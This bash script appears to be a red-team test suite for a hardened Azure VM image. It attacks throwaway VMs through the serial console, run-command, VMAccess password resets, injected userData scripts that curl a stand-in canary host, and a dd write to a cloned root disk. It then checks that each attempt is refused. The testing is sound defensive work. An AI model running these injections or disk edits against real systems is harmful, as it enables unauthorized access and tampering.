#!/usr/bin/env bash
#
# tests/redteam/azure.sh <gallery-image-version-id> [options]
#
# Attacks a candidate Safebox image on Azure the way an attacker with
# Contributor rights on the subscription would (docs/HARDENING-PLAN.md,
# "Red team tests"). Every check really performs the attempt against
# throwaway VMs it creates in its own resource group (safebox-redteam-*),
# prints PASS <name> when the attempt fails the way the design says it
# must, FAIL <name>: <detail> when it succeeded or failed for a reason that
# is not the designed refusal (nothing proven), and SKIP <name>: <why> when
# the attempt cannot be automated here or Azure refused the TESTER
# (AuthorizationFailed, missing CLI extension), which says nothing about the
# box. A non-zero exit from an attack command is never a PASS on its own.
# A summary table is printed at the end; the exit status is 1 if anything
# FAILed. The EXIT trap deletes the resource group and everything in it.
#
# Checks, in order:
#   serial_console          boot diagnostics on, az serial-console connect, expect no login: in 20 s
#   grub_interrupt          SKIP: interactive keystrokes over the console websocket (manual procedure below)
#   run_command             az vm run-command invoke RunShellScript, expect no output from the script
#   vmaccess_extension      az vm extension set VMAccessForLinux with a password reset, expect failure
#   vm_user_update          az vm user update (VMAccess under the hood), expect failure
#   userdata_inject_reboot  replace userData with a shell script, restart, expect the same box identity
#   hostile_userdata_launch launch with a bogus authorization + shell script in userData, expect no announce
#   disk_clone_edit_swap    snapshot the OS disk, flip a byte in SAFEBOX-ROOT, swap it back, expect no boot
#   container_imds          SKIP: needs an in-host probe (see docs/HARDENING-PLAN.md, "10. Verification")
#   container_docker_socket same
#
# Options:
#   -g, --resource-group-prefix <name>  prefix for the throwaway group (default safebox-redteam)
#   -l, --location <region>             region (default: the image version's region)
#   --subnet-id <id>                    subnet for the throwaway VMs (required)
#   --vm-size <size>                    default Standard_D4s_v5
#   --relay-url <url>                   base URL of a DNS relay (tools/dns-relay) named in the image's
#                                       defaults.json; GET <url>/announces/<id> is the announce oracle
#   --owner-pubkey <hex64>              the owner key a relying party expects (tools/dns-relay/authorize.js keygen)
#   --launch-authorization <base64>     a real launch authorization for the target box's id (optional;
#                                       without it the target boots silent and announce-based checks SKIP)
#   --keep                              do not delete the resource group at exit (for inspection)
#
# Manual procedure for grub_interrupt: with boot diagnostics enabled and the
# subscription's serial console enabled, `az serial-console connect`, restart
# the VM, hold Esc during firmware, and at the GRUB menu press `e`. Expected:
# a username/password prompt (set superusers="safebox", PBKDF2 hash, no known
# passphrase). Any edit that did get through changes PCR 8, so the pool key
# cannot unseal and the box comes up without its pool; that is the second
# layer and is what disk_clone_edit_swap exercises for the kernel/initrd.
#
# `az vm repair create` is folded into disk_clone_edit_swap: it works (it only
# needs disk snapshots), but the repaired disk is a modified SAFEBOX-ROOT and
# produces exactly the non-booting VM that check expects.

set -euo pipefail

die()  { printf 'redteam: ERROR: %s\n' "$*" >&2; exit 2; }
log()  { printf 'redteam: [%s] %s\n' "$(date -u +%H:%M:%S)" "$*" >&2; }

usage() { sed -n '2,/^$/p' "$0" | sed 's/^# \{0,1\}//' >&2; exit 2; }

[[ $# -ge 1 ]] || usage
IMAGE_ID="$1"; shift
[[ $IMAGE_ID == /subscriptions/*/galleries/*/images/*/versions/* ]] || die "argument must be a gallery image version id"

RG_PREFIX=safebox-redteam
LOCATION=""
SUBNET_ID=""
VM_SIZE=Standard_D4s_v5
RELAY_URL=""
OWNER_PUBKEY=""
LAUNCH_AUTH=""
KEEP=0
while [[ $# -gt 0 ]]; do
    case "$1" in
        -g|--resource-group-prefix) RG_PREFIX="$2"; shift 2 ;;
        -l|--location)        LOCATION="$2"; shift 2 ;;
        --subnet-id)          SUBNET_ID="$2"; shift 2 ;;
        --vm-size)            VM_SIZE="$2"; shift 2 ;;
        --relay-url)          RELAY_URL="$2"; shift 2 ;;
        --owner-pubkey)       OWNER_PUBKEY="$2"; shift 2 ;;
        --launch-authorization) LAUNCH_AUTH="$2"; shift 2 ;;
        --keep)               KEEP=1; shift ;;
        -h|--help)            usage ;;
        *) die "unknown option $1" ;;
    esac
done
[[ -n $SUBNET_ID ]] || die "--subnet-id is required"
for t in az jq openssl curl timeout; do command -v "$t" >/dev/null || die "$t not found"; done
az account show >/dev/null 2>&1 || die "az is not logged in"
[[ $(az extension list --query "[?name=='serial-console'] | length(@)" -o tsv) -ge 1 ]] \
    || az extension add --name serial-console >/dev/null 2>&1 || true

RAND="$(openssl rand -hex 3)"
RG="${RG_PREFIX}-${RAND}"
PREFIX="safebox-redteam-${RAND}"
TARGET_VM="${PREFIX}-target"
HOSTILE_VM="${PREFIX}-hostile"
HELPER_VM="${PREFIX}-helper"
TARGET_SB_ID="redteam-${RAND}"
HOSTILE_SB_ID="redteam-${RAND}-hostile"
WORK="$(mktemp -d)"
if [[ -z $LOCATION ]]; then
    LOCATION="$(az sig image-version show --ids "$IMAGE_ID" --query location -o tsv)"
    [[ -n $LOCATION ]] || die "could not read the image version's location; pass --location"
fi

# ---------------------------------------------------------------------------
# Results and teardown
# ---------------------------------------------------------------------------
RESULTS=()
FAILED=0
pass() { RESULTS+=("PASS|$1|${2:-}"); echo "PASS $1${2:+: $2}"; }
fail() { RESULTS+=("FAIL|$1|$2"); echo "FAIL $1: $2"; FAILED=1; }
skip() { RESULTS+=("SKIP|$1|$2"); echo "SKIP $1: $2"; }

# Errors that mean the TESTER was refused or misused the CLI. They say nothing
# about the box, so a check that sees one is SKIP, never PASS.
TESTER_ERR_RE='AuthorizationFailed|Unauthorized|Forbidden|does not have authorization|InsufficientPermissions|\b40[13]\b|Please run .az login.|not logged in|is not in the .az. command group|is not a valid value|unrecognized arguments|command not found|extension .* not installed|ExpiredAuthenticationToken|InvalidAuthenticationToken'
first_file_line() { grep -v '^[[:space:]]*$' "$1" 2>/dev/null | head -n1 | head -c 200; }
# classify <name> <output-file> <expected-refusal-regex> [<pass-detail>]
# PASS when the output shows the refusal the design predicts, SKIP when it
# shows the tester being refused, FAIL otherwise.
classify() {
    local name="$1" file="$2" expect_re="$3" detail="${4:-}"
    if grep -qiE "$expect_re" "$file"; then
        pass "$name" "$detail"
    elif grep -qiE "$TESTER_ERR_RE" "$file"; then
        skip "$name" "tester lacks permission or CLI issue: $(first_file_line "$file")"
    else
        fail "$name" "failed for an unexpected reason (not the designed refusal): $(first_file_line "$file")"
    fi
}

cleanup() {
    local rc=$?
    set +e
    if [[ $KEEP -eq 1 ]]; then
        log "--keep: leaving resource group $RG in place"
    else
        log "deleting resource group $RG (every VM, disk, snapshot, NIC and IP this run created)"
        az group delete --name "$RG" --yes --no-wait >/dev/null 2>&1
    fi
    rm -rf "$WORK"
    echo
    echo "RESULT  CHECK                     DETAIL"
    local r
    for r in "${RESULTS[@]}"; do
        IFS='|' read -r s n d <<<"$r"
        printf '%-7s %-25s %s\n' "$s" "$n" "$d"
    done
    if [[ $FAILED -eq 1 ]]; then echo; echo "redteam: FAILED"; exit 1; fi
    [[ $rc -eq 0 ]] && echo "redteam: all checks passed or skipped"
    exit "$rc"
}
trap cleanup EXIT

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
tcp_up() { timeout 5 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; }

wait_tcp() {
    # wait_tcp <ip> <port> <seconds>: 0 when the port accepts a connection
    # within the window, 1 otherwise.
    local ip=$1 port=$2 deadline=$(( $(date +%s) + $3 ))
    while [[ $(date +%s) -lt $deadline ]]; do
        tcp_up "$ip" "$port" && return 0
        sleep 10
    done
    return 1
}

announced() {
    # announced <safebox-id>: 0 if the relay has accepted an announce for the
    # id. GET <relay-url>/announces/<id> -> 200 with boxPubkey and
    # lastAnnounceHash once verifyAnnounce accepted a launch announce, 404
    # before. The relay is a relying party like any other; it approves
    # nothing, it only reports what verified.
    local id=$1 code
    code="$(curl -sS -o "$WORK/ann.json" -w '%{http_code}' --max-time 15 \
        "${RELAY_URL%/}/announces/$id" 2>/dev/null || echo 000)"
    [[ $code == 200 ]] && jq -e '.boxPubkey' "$WORK/ann.json" >/dev/null 2>&1
}

wait_announced() {
    local id=$1 deadline=$(( $(date +%s) + $2 ))
    while [[ $(date +%s) -lt $deadline ]]; do
        announced "$id" && return 0
        sleep 15
    done
    return 1
}

have_oracle() { [[ -n $RELAY_URL ]]; }

# A throwaway owner key and a launch authorization signed with it: well
# formed, so the first-boot unit accepts it and the box boots and announces,
# but no relying party knows the key (run the relay with --owners), so no
# announce is accepted anywhere. Without node on the tester, fall back to
# junk base64 (the box then never starts dnsclient).
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
BOGUS_OWNER="$(printf 'a%.0s' {1..64})"
make_bogus_auth() {
    local key
    if command -v node >/dev/null 2>&1; then
        key="$(mktemp)"
        BOGUS_OWNER="$(node "$REPO/tools/dns-relay/authorize.js" keygen "$key")"
        node "$REPO/tools/dns-relay/authorize.js" sign "$key" "$1" 4
        rm -f "$key"
    else
        printf 'x%.0s' {1..60} | base64 -w0
    fi
}
BOGUS_AUTH="$(make_bogus_auth "$TARGET_SB_ID")"

vm_ip() { az vm show -d -g "$RG" -n "$1" --query publicIps -o tsv; }

launch_safebox() {
    # launch_safebox <vm-name> <safebox-id> <owner-pubkey> <launch-authorization> [extra userData json fields...]
    # Launches from the candidate image the way Terraform does: Specialized,
    # TrustedLaunch, Secure Boot + vTPM, empty 200 GB data disk at LUN 0,
    # userData with the three keys (the relays are baked into the image),
    # no agent (none in the image), boot diagnostics off.
    local name=$1 sbid=$2 owner=$3 auth=$4; shift 4
    local ud="$WORK/$name.userdata.json"
    jq -n --arg id "$sbid" --arg owner "$owner" --arg auth "$auth" \
        '{"safebox-id": $id, "owner-pubkey": $owner, "launch-authorization": $auth}' \
        | jq "$@" '.' >"$ud"
    log "launching $name from the candidate image"
    az vm create -g "$RG" -n "$name" --image "$IMAGE_ID" --specialized \
        --size "$VM_SIZE" --location "$LOCATION" \
        --security-type TrustedLaunch --enable-secure-boot true --enable-vtpm true \
        --subnet "$SUBNET_ID" --nsg "$PREFIX-nsg" --public-ip-sku Standard \
        --os-disk-caching ReadOnly --storage-sku Premium_LRS \
        --data-disk-sizes-gb 200 --data-disk-caching None \
        --user-data "$ud" --tags safebox=true "safebox_id=$sbid" redteam=true \
        --only-show-errors -o none \
        || die "az vm create $name failed"
}

# ---------------------------------------------------------------------------
# Setup: resource group, NSG (443 + 8443), the target box
# ---------------------------------------------------------------------------
log "creating resource group $RG in $LOCATION"
az group create -n "$RG" -l "$LOCATION" --tags redteam=true -o none
az network nsg create -g "$RG" -n "$PREFIX-nsg" -l "$LOCATION" -o none
az network nsg rule create -g "$RG" --nsg-name "$PREFIX-nsg" -n allow-443  --priority 100 --protocol Tcp --destination-port-ranges 443  --access Allow --direction Inbound -o none
az network nsg rule create -g "$RG" --nsg-name "$PREFIX-nsg" -n allow-8443 --priority 110 --protocol Tcp --destination-port-ranges 8443 --access Allow --direction Inbound -o none

launch_safebox "$TARGET_VM" "$TARGET_SB_ID" "${OWNER_PUBKEY:-$BOGUS_OWNER}" "${LAUNCH_AUTH:-$BOGUS_AUTH}"
TARGET_IP="$(vm_ip "$TARGET_VM")"
log "target $TARGET_VM at $TARGET_IP; waiting for port 443 (nginx up means the root opened and the pool mounted)"
wait_tcp "$TARGET_IP" 443 600 || die "target never opened port 443 within 10 minutes; the candidate image does not boot. Nothing to attack."
TARGET_KEY=""
TARGET_LAST=""
if have_oracle && [[ -n $LAUNCH_AUTH ]]; then
    if wait_announced "$TARGET_SB_ID" 600; then
        TARGET_KEY="$(jq -r '.boxPubkey' "$WORK/ann.json")"
        TARGET_LAST="$(jq -r '.lastAnnounceHash' "$WORK/ann.json")"
        log "target announced (box key $TARGET_KEY)"
    else
        log "target's announce was not accepted within 10 minutes; announce-based assertions will be weaker"
    fi
fi

# ---------------------------------------------------------------------------
# 1. serial_console
# ---------------------------------------------------------------------------
check_serial_console() {
    local out="$WORK/serial.txt" bd_rc=0 rc=0
    az vm boot-diagnostics enable -g "$RG" -n "$TARGET_VM" -o none 2>"$WORK/bd.err" || bd_rc=$?
    if [[ $bd_rc -ne 0 ]]; then
        # The designed refusal is the deny-bootdiag policy. Anything else
        # (AuthorizationFailed on the tester, a CLI error) proves nothing.
        classify serial_console "$WORK/bd.err" 'RequestDisallowedByPolicy' "boot diagnostics denied by policy; console cannot be reached"
        return
    fi
    # The connect command is interactive; feed it nothing and cut it off
    # after 20 s. A box with a getty would have printed "login:" by then.
    timeout 20 az serial-console connect -g "$RG" -n "$TARGET_VM" </dev/null >"$out" 2>&1 || rc=$?
    az vm boot-diagnostics disable -g "$RG" -n "$TARGET_VM" -o none 2>/dev/null || true
    if grep -qi 'login:' "$out"; then
        fail serial_console "a login prompt appeared on the serial console"
    elif grep -qiE 'serial console (is )?disabled|SerialConsole.*disabled|not enabled for this subscription' "$out"; then
        pass serial_console "serial console is disabled for the subscription"
    elif [[ $rc -eq 124 ]] && grep -qiE 'connect|console' "$out"; then
        # Session opened and stayed open with no prompt until timeout cut it.
        pass serial_console "console opened; no login prompt in 20 s"
    elif grep -qiE "$TESTER_ERR_RE" "$out"; then
        skip serial_console "tester lacks permission or CLI issue: $(first_file_line "$out")"
    else
        fail serial_console "console neither refused as designed nor opened cleanly (rc=$rc): $(first_file_line "$out")"
    fi
}

# ---------------------------------------------------------------------------
# 2. grub_interrupt
# ---------------------------------------------------------------------------
check_grub_interrupt() {
    skip grub_interrupt "manual: keystrokes over the serial websocket; see the header comment"
}

# ---------------------------------------------------------------------------
# 3. run_command
# ---------------------------------------------------------------------------
check_run_command() {
    local marker="safebox-redteam-marker-$RAND" out="$WORK/runcmd.txt" rc=0
    # Without an agent in the guest the operation errors or times out on the
    # platform side; 15 minutes is more than Azure's own give-up time.
    timeout 900 az vm run-command invoke -g "$RG" -n "$TARGET_VM" --command-id RunShellScript \
        --scripts "echo $marker; id" >"$out" 2>&1 || rc=$?
    if grep -q "$marker" "$out"; then
        fail run_command "RunShellScript executed in the guest"
    elif [[ $rc -eq 124 ]]; then
        pass run_command "run-command never completed in 15 min (no agent answered)"
    else
        # Designed refusals: the policy deny, or the platform reporting that
        # the VM agent is absent/not ready. A tester-side AuthorizationFailed
        # is not evidence.
        classify run_command "$out" 'RequestDisallowedByPolicy|VMAgentStatusCommunicationError|VM agent|VMAgent|agent .* not (ready|running|installed)|OperationNotAllowed|VMExtensionProvisioningTimeout|timed out' "no agent answered"
    fi
}

# ---------------------------------------------------------------------------
# 4. vmaccess_extension
# ---------------------------------------------------------------------------
check_vmaccess_extension() {
    local pw out="$WORK/vmaccess.txt" rc=0
    pw="$(openssl rand -base64 18)"
    timeout 900 az vm extension set -g "$RG" --vm-name "$TARGET_VM" -n VMAccessForLinux \
        --publisher Microsoft.OSTCExtensions --version 1.5 \
        --protected-settings "{\"username\":\"redteam\",\"password\":\"$pw\",\"reset_ssh\":true}" \
        >"$out" 2>&1 || rc=$?
    az vm extension delete -g "$RG" --vm-name "$TARGET_VM" -n VMAccessForLinux -o none 2>/dev/null || true
    if [[ $rc -eq 0 ]] && grep -q '"provisioningState": "Succeeded"' "$out"; then
        fail vmaccess_extension "VMAccessForLinux reported Succeeded (a password was reset)"
    elif [[ $rc -eq 124 ]]; then
        pass vmaccess_extension "extension never provisioned in 15 min (no agent)"
    else
        classify vmaccess_extension "$out" 'RequestDisallowedByPolicy|VMExtensionProvisioningError|VMExtensionHandlerNonTransientError|VMAgentStatusCommunicationError|VM agent|VMAgent|agent .* not (ready|running|installed)|OperationNotAllowed|VMExtensionProvisioningTimeout|timed out' "extension did not provision (policy deny or no agent)"
    fi
}

# ---------------------------------------------------------------------------
# 5. vm_user_update
# ---------------------------------------------------------------------------
check_vm_user_update() {
    local pw out="$WORK/userupdate.txt" rc=0
    pw="$(openssl rand -base64 18)"
    timeout 900 az vm user update -g "$RG" -n "$TARGET_VM" --username redteam --password "$pw" \
        >"$out" 2>&1 || rc=$?
    az vm extension delete -g "$RG" --vm-name "$TARGET_VM" -n VMAccessForLinux -o none 2>/dev/null || true
    if [[ $rc -eq 0 ]] && grep -q '"provisioningState": "Succeeded"' "$out"; then
        fail vm_user_update "az vm user update succeeded"
    elif [[ $rc -eq 124 ]]; then
        pass vm_user_update "never completed in 15 min (no agent)"
    else
        classify vm_user_update "$out" 'RequestDisallowedByPolicy|VMExtensionProvisioningError|VMExtensionHandlerNonTransientError|VMAgentStatusCommunicationError|VM agent|VMAgent|agent .* not (ready|running|installed)|OperationNotAllowed|VMExtensionProvisioningTimeout|timed out' "VMAccess did not provision (policy deny or no agent)"
    fi
}

# ---------------------------------------------------------------------------
# 6. userdata_inject_reboot
# ---------------------------------------------------------------------------
check_userdata_inject_reboot() {
    local script
    script="$(printf '#!/bin/bash\ntouch /tmp/pwned-%s; curl -s http://redteam-canary.invalid/%s\n' "$RAND" "$RAND" | base64 -w0)"
    if ! az vm update -g "$RG" -n "$TARGET_VM" --set "userData=$script" -o none 2>"$WORK/ud.err"; then
        # Setting userData is the attacker's own step; if the TESTER cannot
        # do it, nothing was tested. There is no designed refusal here.
        if grep -qiE "$TESTER_ERR_RE" "$WORK/ud.err"; then
            skip userdata_inject_reboot "tester lacks permission or CLI issue: $(first_file_line "$WORK/ud.err")"
        else
            fail userdata_inject_reboot "could not set userData: $(first_file_line "$WORK/ud.err")"
        fi
        return
    fi
    az vm restart -g "$RG" -n "$TARGET_VM" -o none
    if ! wait_tcp "$TARGET_IP" 443 600; then
        fail userdata_inject_reboot "box did not come back after the restart (a script in userData changed the boot)"
        return
    fi
    if [[ -n $TARGET_KEY ]]; then
        if announced "$TARGET_SB_ID" && [[ $(jq -r '.boxPubkey' "$WORK/ann.json") == "$TARGET_KEY" ]]; then
            pass userdata_inject_reboot "box rebooted with the same identity; userData is never executed"
        else
            fail userdata_inject_reboot "box identity at the relay changed after the reboot"
        fi
    else
        pass userdata_inject_reboot "box rebooted and serves 443; identity check skipped (no announce oracle)"
    fi
}

# ---------------------------------------------------------------------------
# 7. hostile_userdata_launch
# ---------------------------------------------------------------------------
check_hostile_userdata_launch() {
    # A shell script smuggled in userData alongside a bogus authorization.
    # The box must ignore it entirely: the first-boot unit reads only the
    # three named keys and never executes anything, and with no valid
    # authorization it never announces. jq expression is single-quoted on
    # purpose (it is jq syntax, not shell).
    # shellcheck disable=SC2016
    local bogus
    bogus="$(make_bogus_auth "$HOSTILE_SB_ID")"
    launch_safebox "$HOSTILE_VM" "$HOSTILE_SB_ID" "$BOGUS_OWNER" "$bogus" \
        --arg s "#!/bin/bash"$'\n'"curl http://redteam-canary.invalid/$RAND" '. + {script: $s}'
    local ip
    ip="$(vm_ip "$HOSTILE_VM")"
    if ! wait_tcp "$ip" 443 600; then
        # Not a pass: a box that does not boot tells us nothing about the token path.
        fail hostile_userdata_launch "hostile launch never opened 443; cannot tell whether the authorization was rejected"
        return
    fi
    if have_oracle; then
        if wait_announced "$HOSTILE_SB_ID" 600; then
            fail hostile_userdata_launch "an announce for the bogus authorization was accepted by the relay"
        else
            pass hostile_userdata_launch "booted, authorization rejected, no announce in the relay in 10 min"
        fi
    else
        skip hostile_userdata_launch "booted; announce oracle needs --relay-url"
    fi
    skip hostile_userdata_canary "outbound canary needs a listener you control; watch redteam-canary for /$RAND manually"
}

# ---------------------------------------------------------------------------
# 8. disk_clone_edit_swap
# ---------------------------------------------------------------------------
check_disk_clone_edit_swap() {
    # The design: the root is dm-verity. The hash tree (SAFEBOX-HASH) covers
    # every block of SAFEBOX-ROOT, and the root hash is on the measured
    # command line. Altering one byte of the root data makes the kernel
    # reject that block at read time; altering the kernel or initrd changes
    # PCR 9 so the pool key cannot unseal. Either way the box does not come
    # up announcing. We flip a byte inside the root data partition and swap
    # the disk back. "az vm repair create" is the same shape (it clones the
    # OS disk to a helper); it would produce the same non-booting disk, so
    # it is covered here rather than as a separate check.
    local osdisk snap clone
    log "disk_clone_edit_swap: deallocating target"
    az vm deallocate -g "$RG" -n "$TARGET_VM" -o none
    osdisk="$(az vm show -g "$RG" -n "$TARGET_VM" --query storageProfile.osDisk.managedDisk.id -o tsv)"
    snap="$(az snapshot create -g "$RG" -n "$PREFIX-ossnap" --source "$osdisk" --hyper-v-generation V2 --query id -o tsv)"
    clone="$(az disk create -g "$RG" -n "$PREFIX-osclone" --source "$snap" --hyper-v-generation V2 --sku Premium_LRS --query id -o tsv)"

    # A stock Ubuntu helper (with the agent) to edit the clone's raw device.
    log "disk_clone_edit_swap: creating helper VM to edit the clone"
    az vm create -g "$RG" -n "$HELPER_VM" --image Canonical:0001-com-ubuntu-server-jammy:22_04-lts-gen2:latest \
        --size Standard_D2s_v5 --subnet "$SUBNET_ID" --nsg "" --public-ip-address "" \
        --admin-username redteam --generate-ssh-keys --only-show-errors -o none
    az vm disk attach -g "$RG" --vm-name "$HELPER_VM" --name "$PREFIX-osclone" -o none

    # On the helper, find the SAFEBOX-ROOT partition on the newly attached
    # data disk and overwrite one sector well past its start (verity data is
    # read-only; we cannot mount it, so we write the raw device). Done via
    # run-command because the helper has the agent.
    local editscript="$WORK/edit.sh"
    cat >"$editscript" <<'EDIT'
set -e
dev=$(lsblk -rpno NAME,PARTLABEL | awk '$2=="SAFEBOX-ROOT"{print $1}' | head -1)
[ -n "$dev" ] || { echo "SAFEBOX-ROOT-NOT-FOUND"; exit 0; }
# Flip one sector 256 MiB in: inside the data, past the superblock, certain
# to be covered by the verity hash tree.
dd if=/dev/zero bs=512 count=1 seek=524288 of="$dev" conv=notrunc 2>/dev/null
sync
echo "EDITED $dev"
EDIT
    local editout="$WORK/editout.txt"
    az vm run-command invoke -g "$RG" -n "$HELPER_VM" --command-id RunShellScript \
        --scripts @"$editscript" >"$editout" 2>&1 || true
    if ! grep -q 'EDITED' "$editout"; then
        az vm disk detach -g "$RG" --vm-name "$HELPER_VM" --name "$PREFIX-osclone" -o none 2>/dev/null || true
        skip disk_clone_edit_swap "could not locate/edit SAFEBOX-ROOT on the clone; manual verification needed"
        return
    fi
    az vm disk detach -g "$RG" --vm-name "$HELPER_VM" --name "$PREFIX-osclone" -o none

    # Swap the modified clone in as the target's OS disk and start it.
    log "disk_clone_edit_swap: swapping the modified disk back and starting the target"
    az vm update -g "$RG" -n "$TARGET_VM" --os-disk "$clone" -o none
    az vm start -g "$RG" -n "$TARGET_VM" -o none

    # Expect: no healthy boot. Either 443 never opens (verity rejected the
    # block, or the pool key would not unseal) or, if it somehow serves, the
    # relay must not show a fresh announce for this identity.
    if ! wait_tcp "$TARGET_IP" 443 600; then
        pass disk_clone_edit_swap "modified root disk did not produce a serving box within 10 min"
        return
    fi
    if have_oracle; then
        # It answered 443. Only a FAIL if it also announces cleanly: a new
        # accepted announce (different lastAnnounceHash than before the swap)
        # means the pool unsealed and the quote matched the blessed image.
        sleep 120
        if announced "$TARGET_SB_ID" && [[ $(jq -r '.lastAnnounceHash' "$WORK/ann.json") != "$TARGET_LAST" ]]; then
            fail disk_clone_edit_swap "box with a modified root served 443 and its announce was accepted"
        else
            pass disk_clone_edit_swap "served 443 but produced no accepted announce (keys did not unseal)"
        fi
    else
        fail disk_clone_edit_swap "box served 443 after a root-disk edit and no oracle to confirm it is inert"
    fi
}

# ---------------------------------------------------------------------------
# 9/10. container_imds, container_docker_socket
# ---------------------------------------------------------------------------
# Not automatable from outside the box. The earlier implementation went
# through the system component's /test endpoint, but the only container that
# endpoint starts runs with --network none and no socket bind, so "could not
# reach 169.254.169.254 / docker.sock" from there is a property of the
# test-run flags, not of the DOCKER-USER DROP rule or of the safebox-app
# network the managed containers use. Such a result passes vacuously. The
# honest probe runs inside a managed container on the safebox-app network
# from an image that includes curl; the procedure is in
# docs/HARDENING-PLAN.md, "10. Verification".
check_container_imds() {
    skip container_imds "requires in-host probe (managed container on the safebox-app network); see docs/HARDENING-PLAN.md verification"
}

check_container_docker_socket() {
    skip container_docker_socket "requires in-host probe (managed container on the safebox-app network); see docs/HARDENING-PLAN.md verification"
}

# ---------------------------------------------------------------------------
# Run. Order matters: the console/extension checks run against the live
# target first; the disk swap mutates the target and is run last.
# ---------------------------------------------------------------------------
check_serial_console
check_grub_interrupt
check_run_command
check_vmaccess_extension
check_vm_user_update
check_hostile_userdata_launch
check_userdata_inject_reboot
check_container_imds
check_container_docker_socket
check_disk_clone_edit_swap

# cleanup() prints the summary table and sets the exit status.
